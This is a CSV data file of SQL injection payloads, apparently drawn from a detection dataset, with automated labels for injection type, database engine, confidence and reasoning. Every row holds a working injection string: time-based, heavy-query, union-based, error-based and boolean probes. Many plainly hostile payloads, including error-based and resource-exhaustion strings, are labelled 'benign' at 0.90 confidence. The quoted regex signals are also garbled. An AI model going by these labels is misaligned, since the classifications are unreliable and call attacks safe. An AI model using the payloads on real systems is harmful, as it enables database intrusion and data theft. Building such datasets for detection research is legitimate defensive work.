id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24144,"1 ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24145,( select * from ( select ( sleep ( 5 ) ) ) lrov ),time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24146,"1"" ) as ltbl where 6395 = 6395",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24147,1'+ ( select wpkh where 5842 = 5842,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24148,"1'|| ( select 'ylek' where 3803 = 3803 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24149,1 ) where 5866 = 5866 and 4595 = 4595#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24150,"-2204'|| ( select 'bwae' from dual where 4884 = 4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",union_based,oracle,0.75,Signal match: union (all )?select → union_based (P7),1
24151,"1%"" ) and 9764 = 6037 and ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24152,1' ) as qqyz where 2274 = 2274,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24153,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'qutm' = 'qutm",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24154,"-9808' in boolean mode ) union all select 2528,2528,2528,2528,2528,2528,2528--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24155,1' ) ) waitfor delay '0:0:5' and ( ( 'jcfe' = 'jcfe,time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
24156,"1"" where 7788 = 7788 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24157,1' where 4253 = 4253,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24158,"-8966"" ) ) ) or 1628 = 2712",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24159,"1' union all select null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24160,"1, ( select ( case when ( 7734 = 7734 ) then ( select benchmark ( 5000000,md5 ( 0x72747341 ) ) ) else 7734* ( select 7734 from mysql.db ) end ) )",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
24161,"1' in boolean mode ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24162,"-5227"" union all select 2666--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24163,"-9176' ) ) as eunw where 5978 = 5978 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24164,"-3074' ) ) union all select 6131,6131,6131,6131,6131,6131,6131--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24165,1' and sleep ( 5 ) and 'kapr' = 'kapr,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24166,"1%' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24167,"1 ) where 6720 = 6720 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24168,"-9698 ) as pvhn where 3223 = 3223 or elt ( 6563 = 9210,9210 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24169,"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""mynm"" like ""mynm",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
24170,-1989%' ) ) or 6179 = 8518#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24171,1'|| ( select 'vwls' where 5252 = 5252 rlike sleep ( 5 ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
